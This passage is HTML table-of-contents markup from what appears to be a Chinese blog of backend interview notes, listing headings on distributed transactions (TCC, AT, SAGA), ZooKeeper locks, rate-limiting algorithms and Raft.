href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A"><span class="toc-text">✅ 解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A-2"><span class="toc-text">✅ 解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A-3"><span class="toc-text">✅ 解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A-4"><span class="toc-text">✅ 解释：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E8%A7%A3%E9%87%8A%EF%BC%9A-5"><span class="toc-text">✅ 解释：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E8%AE%B2%EF%BC%9A"><span class="toc-text">✅ 总结一句话可以这样讲：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E4%B8%AA%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E6%A8%A1%E5%9E%8B%E5%AF%B9%E6%AF%94%EF%BC%88XA%E3%80%81TCC%E3%80%81AT%E3%80%81SAGA%E3%80%81%E6%B6%88%E6%81%AF%E4%BA%8B%E5%8A%A1%EF%BC%89"><span class="toc-text">多个分布式事务模型对比（XA、TCC、AT、SAGA、消息事务）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8C-%E6%AF%8F%E7%A7%8D%E6%96%B9%E6%A1%88%E7%AE%80%E8%A6%81%E8%AF%B4%E6%98%8E-%E4%BD%BF%E7%94%A8%E5%BB%BA%E8%AE%AE"><span class="toc-text">📌 每种方案简要说明 + 使用建议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B4-XA%EF%BC%882PC%EF%BC%89"><span class="toc-text">🔴 XA（2PC）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9F%A1-TCC-%E6%A8%A1%E5%BC%8F"><span class="toc-text">🟡 TCC 模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B5-AT-%E6%A8%A1%E5%BC%8F%EF%BC%88Seata-%E4%B8%93%E5%B1%9E%EF%BC%89"><span class="toc-text">🔵 AT 模式（Seata 专属）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9F%A2-%E6%B6%88%E6%81%AF%E4%BA%8B%E5%8A%A1%EF%BC%88%E6%9C%80%E7%BB%88%E4%B8%80%E8%87%B4%EF%BC%89"><span class="toc-text">🟢 消息事务（最终一致）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E6%8E%A8%E8%8D%90%E5%9B%9E%E7%AD%94%E6%80%9D%E8%B7%AF"><span class="toc-text">🧠 面试推荐回答思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-1-TCC-%E6%A8%A1%E5%BC%8F-%E2%80%94%E3%80%90%E4%B8%8B%E5%8D%95-%E9%94%81%E5%BA%93%E5%AD%98%E3%80%91"><span class="toc-text">🧩 1. TCC 模式 —【下单+锁库存】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%9A-%E5%9C%BA%E6%99%AF%EF%BC%9A"><span class="toc-text">📚 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A5%E9%AA%A4%E8%AF%A6%E8%A7%A3%EF%BC%9A"><span class="toc-text">✅ 步骤详解：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-Try%EF%BC%88%E9%A2%84%E5%A4%84%E7%90%86%E9%98%B6%E6%AE%B5%EF%BC%89%EF%BC%9A"><span class="toc-text">🔹 Try（预处理阶段）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-Confirm%EF%BC%88%E7%A1%AE%E8%AE%A4%E6%8F%90%E4%BA%A4%EF%BC%89%EF%BC%9A"><span class="toc-text">🔹 Confirm（确认提交）：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-Cancel%EF%BC%88%E5%9B%9E%E6%BB%9A%E9%87%8A%E6%94%BE%EF%BC%89%EF%BC%9A"><span class="toc-text">🔹 Cancel（回滚释放）：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-2-AT-%E6%A8%A1%E5%BC%8F-%E2%80%94%E3%80%90%E4%B8%8B%E5%8D%95-%E6%89%A3%E5%BA%93%E5%AD%98%EF%BC%88%E5%90%8C%E5%BA%93%E6%88%96%E5%90%8C%E6%A1%86%E6%9E%B6%EF%BC%89%E3%80%91"><span class="toc-text">🧩 2. AT 模式 —【下单 + 扣库存（同库或同框架）】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%9A-%E5%9C%BA%E6%99%AF%EF%BC%9A-2"><span class="toc-text">📚 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A5%E9%AA%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E7%94%B1-Seata-%E8%87%AA%E5%8A%A8%E5%A4%84%E7%90%86%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 步骤详解（由 Seata 自动处理）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E6%89%A7%E8%A1%8C%E4%B8%9A%E5%8A%A1-SQL%EF%BC%9A"><span class="toc-text">🔹 执行业务 SQL：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E5%9C%A8%E6%89%A7%E8%A1%8C%E6%97%B6%EF%BC%8CSeata-%E6%8B%A6%E6%88%AA-SQL%EF%BC%8C%E8%AE%B0%E5%BD%95-UndoLog-%E5%BF%AB%E7%85%A7%EF%BC%9A"><span class="toc-text">🔹 在执行时，Seata 拦截 SQL，记录 UndoLog 快照：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E6%8F%90%E4%BA%A4%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%9A"><span class="toc-text">🔹 提交成功后：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E5%A6%82%E6%9E%9C%E4%BA%8B%E5%8A%A1%E5%A4%B1%E8%B4%A5%EF%BC%9A"><span class="toc-text">🔹 如果事务失败：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-3-SAGA-%E6%A8%A1%E5%BC%8F-%E2%80%94%E3%80%90%E6%9C%BA%E7%A5%A8-%E9%85%92%E5%BA%97-%E7%A7%9F%E8%BD%A6-%E5%A4%9A%E9%98%B6%E6%AE%B5%E9%93%BE%E8%B7%AF%E3%80%91"><span class="toc-text">🧩 3. SAGA 模式 —【机票 + 酒店 + 租车 多阶段链路】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%9A-%E5%9C%BA%E6%99%AF%EF%BC%9A-3"><span class="toc-text">📚 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A5%E9%AA%A4%E8%AF%A6%E8%A7%A3%EF%BC%9A-2"><span class="toc-text">✅ 步骤详解：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E5%AD%90%E4%BA%8B%E5%8A%A11%EF%BC%9A%E9%A2%84%E8%AE%A2%E8%88%AA%E7%8F%AD%EF%BC%88FlightService-bookFlight%EF%BC%89"><span class="toc-text">🔹 子事务1：预订航班（FlightService.bookFlight）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E5%AD%90%E4%BA%8B%E5%8A%A12%EF%BC%9A%E9%A2%84%E8%AE%A2%E9%85%92%E5%BA%97%EF%BC%88HotelService-bookRoom%EF%BC%89"><span class="toc-text">🔹 子事务2：预订酒店（HotelService.bookRoom）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-%E5%AD%90%E4%BA%8B%E5%8A%A13%EF%BC%9A%E9%A2%84%E8%AE%A2%E7%A7%9F%E8%BD%A6"><span class="toc-text">🔹 子事务3：预订租车</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%81-%E6%AD%A4%E6%97%B6%E5%BC%80%E5%A7%8B%E8%A1%A5%E5%81%BF%EF%BC%9A"><span class="toc-text">🔁 此时开始补偿：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-4-%E6%B6%88%E6%81%AF%E4%BA%8B%E5%8A%A1-%E2%80%94%E3%80%90%E7%94%A8%E6%88%B7%E4%B8%8B%E5%8D%95%E5%90%8E%E5%BC%82%E6%AD%A5%E5%8F%91%E6%94%BE%E4%BC%98%E6%83%A0%E5%88%B8%E3%80%91"><span class="toc-text">🧩 4. 消息事务 —【用户下单后异步发放优惠券】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%9A-%E5%9C%BA%E6%99%AF%EF%BC%9A-4"><span class="toc-text">📚 场景：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A5%E9%AA%A4%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BB%A5-RocketMQ-%E4%B8%BA%E4%BE%8B%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 步骤详解（以 RocketMQ 为例）：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-Step-1%EF%BC%9A%E5%8F%91%E9%80%81%E2%80%9C%E5%8D%8A%E6%B6%88%E6%81%AF%E2%80%9D%E5%88%B0-MQ"><span class="toc-text">🔹 Step 1：发送“半消息”到 MQ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-Step-2%EF%BC%9A%E6%89%A7%E8%A1%8C%E6%9C%AC%E5%9C%B0%E8%AE%A2%E5%8D%95%E6%8F%92%E5%85%A5%E4%BA%8B%E5%8A%A1"><span class="toc-text">🔹 Step 2：执行本地订单插入事务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-Step-3%EF%BC%9A"><span class="toc-text">🔹 Step 3：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%F0%9F%94%B9-Step-4%EF%BC%9A%E6%B6%88%E8%B4%B9%E8%80%85%E6%94%B6%E5%88%B0%E6%B6%88%E6%81%AF%EF%BC%8C%E5%8F%91%E6%94%BE%E4%BC%98%E6%83%A0%E5%88%B8"><span class="toc-text">🔹 Step 4：消费者收到消息，发放优惠券</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">OLAP、OLTP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">12306项目中订单数据采用了分库分表，那假如我想统计在某个时间段内订单量怎么办？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E5%8F%A5%E8%AF%9D%E5%9B%9E%E7%AD%94%E6%80%9D%E8%B7%AF%EF%BC%9A"><span class="toc-text">✅ 一句话回答思路：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E8%AF%A6%E7%BB%86%E5%9B%9E%E7%AD%94%E6%80%9D%E8%B7%AF%EF%BC%88%E9%80%82%E5%90%88%E9%9D%A2%E8%AF%95%EF%BC%89"><span class="toc-text">🔍 详细回答思路（适合面试）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%8E%AF-%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%E9%A2%98%EF%BC%9A"><span class="toc-text">🎯 面试官问题：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E7%AD%94%E6%A1%88%E7%BB%93%E6%9E%84%E5%BB%BA%E8%AE%AE%E5%A6%82%E4%B8%8B%F0%9F%91%87"><span class="toc-text">✅ 答案结构建议如下👇</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%85%88%E8%AF%B4%E6%98%8E%EF%BC%9A%E7%A1%AE%E5%AE%9E%E5%AD%98%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-text">1、先说明：确实存在这个问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%84%B6%E5%90%8E%E7%BB%99%E5%87%BA%E5%87%A0%E7%A7%8D%E5%8F%AF%E9%80%89%E6%96%B9%E6%A1%88%EF%BC%88%E5%90%AB%E7%9C%9F%E5%AE%9E%E5%B7%A5%E7%A8%8B%E5%81%9A%E6%B3%95%EF%BC%89"><span class="toc-text">2、然后给出几种可选方案（含真实工程做法）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%B8%80%EF%BC%9A%E9%80%9A%E8%BF%87%E4%B8%AD%E9%97%B4%E5%B1%82%E8%81%9A%E5%90%88%EF%BC%88%E9%80%82%E7%94%A8%E4%BA%8E%E7%BB%9F%E8%AE%A1%E4%B8%8D%E9%A2%91%E7%B9%81%EF%BC%89"><span class="toc-text">✅ 方案一：通过中间层聚合（适用于统计不频繁）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%BA%8C%EF%BC%9A%E5%AE%9A%E6%97%B6%E6%B1%87%E6%80%BB-Redis-%E7%BC%93%E5%AD%98%E7%BB%93%E6%9E%9C%EF%BC%88%E6%88%91%E6%8E%A8%E8%8D%90%EF%BC%89"><span class="toc-text">✅ 方案二：定时汇总 + Redis 缓存结果（我推荐）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E4%B8%89%EF%BC%9A%E5%90%8C%E6%AD%A5%E5%88%B0-OLAP-%E5%AE%9E%E6%97%B6%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F%EF%BC%88ClickHouse%E3%80%81Doris%EF%BC%89"><span class="toc-text">✅ 方案三：同步到 OLAP 实时分析系统（ClickHouse、Doris）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E6%96%B9%E6%A1%88%E5%9B%9B%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%AD%E9%97%B4%E4%BB%B6%EF%BC%88ShardingSphere-%E7%9A%84%E5%B9%BF%E6%92%AD%E8%81%9A%E5%90%88%EF%BC%89"><span class="toc-text">✅ 方案四：使用分布式中间件（ShardingSphere 的广播聚合）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%9C%80%E5%90%8E%E8%A1%A5%E4%B8%80%E5%8F%A5%E9%A1%B9%E7%9B%AE%E4%B8%AD%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%EF%BC%88%E5%8A%A0%E5%88%86%E9%A1%B9%EF%BC%89"><span class="toc-text">3、最后补一句项目中怎么做的（加分项）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E9%9D%A2%E8%AF%95%E5%AE%98%E7%88%B1%E5%90%AC%E7%9A%84%E5%85%B3%E9%94%AE%E8%AF%8D%EF%BC%9A"><span class="toc-text">🧠 面试官爱听的关键词：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Zookeeper</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%80%E3%80%81ZooKeeper-%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">✅ 一、ZooKeeper 是什么？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E5%AE%9A%E4%B9%89%EF%BC%9A"><span class="toc-text">📌 定义：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-ZooKeeper%EF%BC%9F"><span class="toc-text">🧠 为什么需要 ZooKeeper？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8C%E3%80%81ZooKeeper-%E7%9A%84%E6%A0%B8%E5%BF%83%E7%BB%93%E6%9E%84%EF%BC%9A%E7%9B%AE%E5%BD%95%E6%A0%91%EF%BC%88ZNode%EF%BC%89"><span class="toc-text">✅ 二、ZooKeeper 的核心结构：目录树（ZNode）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%81-%E7%B1%BB%E6%AF%94%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">📁 类比文件系统的例子：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-ZNode-%E7%89%B9%E7%82%B9%EF%BC%9A"><span class="toc-text">✅ ZNode 特点：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BE%E4%BE%8B%E8%AF%B4%E6%98%8E%E7%9B%AE%E5%BD%95%E5%94%AF%E4%B8%80%E6%80%A7%EF%BC%9A"><span class="toc-text">📌 举例说明目录唯一性：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9B%E3%80%81ZooKeeper-%E7%9A%84%E4%B8%80%E8%87%B4%E6%80%A7%E5%8D%8F%E8%AE%AE%EF%BC%9AZAB"><span class="toc-text">✅ 四、ZooKeeper 的一致性协议：ZAB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%BD%A0%E9%9D%A2%E8%AF%95%E6%97%B6%E5%8F%AF%E4%BB%A5%E8%BF%99%E4%B9%88%E8%AF%B4%EF%BC%9A"><span class="toc-text">✅ 总结你面试时可以这么说：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8-ZooKeeper-%E5%AE%9E%E7%8E%B0%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E7%9A%84%E5%85%B3%E9%94%AE%E5%8E%9F%E7%90%86"><span class="toc-text">用 ZooKeeper 实现分布式锁的关键原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A7-%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%EF%BC%88%E4%BB%A5-lock-%E4%B8%BA%E9%94%81%E7%9B%AE%E5%BD%95%EF%BC%89"><span class="toc-text">🔧 实现流程（以 &#x2F;lock 为锁目录）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-Step-by-step-%E8%AF%A6%E7%BB%86%E6%B5%81%E7%A8%8B%EF%BC%88%E5%9B%BE%E8%A7%A3%E5%BC%8F%EF%BC%89"><span class="toc-text">🧩 Step-by-step 详细流程（图解式）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E6%89%80%E6%9C%89%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%83%BD%E5%90%91-lock-%E8%8A%82%E7%82%B9%E4%B8%8B-%E5%88%9B%E5%BB%BA%E9%A1%BA%E5%BA%8F%E4%B8%B4%E6%97%B6%E8%8A%82%E7%82%B9%EF%BC%9A"><span class="toc-text">1、所有客户端都向 &#x2F;lock 节点下 创建顺序临时节点：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E6%AF%8F%E4%B8%AA%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%8E%B7%E5%8F%96-lock-%E4%B8%8B%E6%89%80%E6%9C%89%E8%8A%82%E7%82%B9%EF%BC%8C%E6%89%BE%E5%87%BA%E8%87%AA%E5%B7%B1%E6%98%AF%E5%90%A6%E6%98%AF%E6%9C%80%E5%B0%8F%E7%9A%84%E3%80%82"><span class="toc-text">2、每个客户端获取 &#x2F;lock 下所有节点，找出自己是否是最小的。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF-A-%E6%89%A7%E8%A1%8C%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%EF%BC%88%E6%8B%A5%E6%9C%89%E9%94%81%EF%BC%89"><span class="toc-text">3、客户端 A 执行业务逻辑（拥有锁）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF-A-%E6%89%A7%E8%A1%8C%E5%AE%8C%E5%90%8E%EF%BC%8C%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5-%E5%88%A0%E9%99%A4%E8%8A%82%E7%82%B9"><span class="toc-text">4、客户端 A 执行完后，断开连接 &#x2F; 删除节点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF-B-%E6%94%B6%E5%88%B0%E9%80%9A%E7%9F%A5%E5%90%8E%EF%BC%8C%E5%88%A4%E6%96%AD%E8%87%AA%E5%B7%B1%E6%98%AF%E5%90%A6%E6%98%AF%E6%9C%80%E5%B0%8F%E8%8A%82%E7%82%B9-%E2%86%92-%E8%8E%B7%E5%8F%96%E9%94%81"><span class="toc-text">5、客户端 B 收到通知后，判断自己是否是最小节点 → 获取锁</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E6%97%B6%E4%BD%A0%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">✅ 面试时你可以这样总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%91%E5%90%AC%E9%A3%8E%E6%9A%B4"><span class="toc-text">监听风暴</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%A5-%E4%B8%BE%E4%B8%AA%E7%BB%8F%E5%85%B8%E7%9A%84%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">🔥 举个经典的例子：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8C-%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%87%BA%E7%8E%B0%E7%9B%91%E5%90%AC%E9%A3%8E%E6%9A%B4%EF%BC%9F"><span class="toc-text">📌 为什么会出现监听风暴？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%A6%82%E4%BD%95%E9%81%BF%E5%85%8D%E7%9B%91%E5%90%AC%E9%A3%8E%E6%9A%B4%EF%BC%9F"><span class="toc-text">✅ 如何避免监听风暴？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A"><span class="toc-text">🎯 面试总结一句话：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%BA%E5%BA%8F%E4%B8%80%E8%87%B4%E6%80%A7%E4%B8%8E%E5%BC%BA%E4%B8%80%E8%87%B4%E6%80%A7"><span class="toc-text">顺序一致性与强一致性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E6%8B%86%E8%A7%A3%E6%A6%82%E5%BF%B5%E7%90%86%E8%A7%A3%EF%BC%9A"><span class="toc-text">🔍 拆解概念理解：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-1-Zookeeper-%E7%9A%84%E4%B8%80%E8%87%B4%E6%80%A7%E6%A8%A1%E5%9E%8B%E6%98%AF%E3%80%8C%E9%A1%BA%E5%BA%8F%E4%B8%80%E8%87%B4%E6%80%A7%E3%80%8D%EF%BC%9A"><span class="toc-text">🧠 1. Zookeeper 的一致性模型是「顺序一致性」：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%90-2-%E4%B8%BA%E4%BB%80%E4%B9%88%E8%AF%B4-ZK-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E6%98%AF%E2%80%9C%E5%BC%BA%E4%B8%80%E8%87%B4%E7%9A%84%E2%80%9D%EF%BC%9F"><span class="toc-text">🔐 2. 为什么说 ZK 分布式锁是“强一致的”？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">分布式常用限流算法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A0-%E5%9B%BA%E5%AE%9A%E7%AA%97%E5%8F%A3%E9%99%90%E6%B5%81%EF%BC%88Fixed-Window%EF%BC%89"><span class="toc-text">① 固定窗口限流（Fixed Window）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A1-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E9%99%90%E6%B5%81%EF%BC%88Sliding-Window%EF%BC%89"><span class="toc-text">② 滑动窗口限流（Sliding Window）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A2-%E6%BC%8F%E6%A1%B6%E7%AE%97%E6%B3%95%EF%BC%88Leaky-Bucket%EF%BC%89"><span class="toc-text">③ 漏桶算法（Leaky Bucket）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%91%A3-%E4%BB%A4%E7%89%8C%E6%A1%B6%E7%AE%97%E6%B3%95%EF%BC%88Token-Bucket%EF%BC%89"><span class="toc-text">④ 令牌桶算法（Token Bucket）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E5%AE%9A%E7%AA%97%E5%8F%A3%E9%99%90%E6%B5%81%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="toc-text">固定窗口限流的缺点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%80%9A%E4%BF%97%E8%A7%A3%E9%87%8A%EF%BC%88%E6%89%93%E6%AF%94%E6%96%B9%EF%BC%89"><span class="toc-text">✅ 通俗解释（打比方）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BA%E5%AE%9A%E7%AA%97%E5%8F%A3%E9%99%90%E6%B5%81%E7%9A%84%E9%80%BB%E8%BE%91%E6%98%AF%EF%BC%9A"><span class="toc-text">固定窗口限流的逻辑是：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E7%94%A8%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%88%E8%A7%A3%E5%86%B3%E5%9B%BA%E5%AE%9A%E7%AA%97%E5%8F%A3%E9%99%90%E6%B5%81%E7%9A%84%E7%AA%81%E5%88%BA%E9%97%AE%E9%A2%98%EF%BC%89"><span class="toc-text">✅ 用滑动窗口的解决方案（解决固定窗口限流的突刺问题）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%84-%E4%B8%BE%E4%BE%8B%EF%BC%9A"><span class="toc-text">🔄 举例：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">Raft协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E5%9C%BA%E6%99%AF%E8%AE%BE%E5%AE%9A%EF%BC%885-%E4%B8%AA%E8%8A%82%E7%82%B9%EF%BC%89"><span class="toc-text">🧪 场景设定（5 个节点）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%8F%B1%EF%B8%8F-1-%E9%80%89%E4%B8%BE%E9%98%B6%E6%AE%B5%EF%BC%88Leader-Election%EF%BC%89"><span class="toc-text">⏱️ 1. 选举阶段（Leader Election）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9%E8%A7%A6%E5%8F%91%E9%80%89%E4%B8%BE"><span class="toc-text">🔹触发选举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%B9%E6%8A%95%E7%A5%A8%E8%A7%84%E5%88%99"><span class="toc-text">🔹投票规则</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9D-2-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%91%E8%AF%B7%E6%B1%82%EF%BC%88%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5%EF%BC%89"><span class="toc-text">📝 2. 客户端发请求（日志写入）</span></a><ol 